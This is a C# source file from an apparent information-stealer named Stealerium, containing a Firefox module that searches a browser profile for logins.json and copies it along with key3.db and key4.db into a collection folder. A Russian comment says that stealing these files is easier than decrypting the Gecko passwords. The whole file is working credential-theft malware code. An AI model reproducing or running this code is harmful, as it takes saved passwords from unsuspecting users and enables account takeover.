using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox
{
    internal sealed class CLogins
    {
        private static readonly string[] KeyFiles = {"key3.db", "key4.db", "logins.json"};

        // Copy key3.db, key4.db, logins.json if exists
        private static void CopyDatabaseFile(string from, string sSavePath)
        {
            try
            {
                if (File.Exists(from))
                    File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> Failed to copy logins\n" + ex);
            }
        }

        /*
            Дешифровка паролей Gecko браузеров - та еще жопa.
            Проще стырить два файла(key3.dll/key4.dll и logins.json)
            переместить их и посмотреть в настройках браузера.
        */
        public static bool GetDbFiles(string path, string sSavePath)
        {
            // If browser path not exists
            if (!Directory.Exists(path)) return false;
            // Detect logins.json file
            var files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);

            foreach (var dbpath in files)
                // Copy key3.db, key4.db, logins.json
            foreach (var db in KeyFiles)
                CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(dbpath), db), sSavePath);
            return true;
        }
    }
}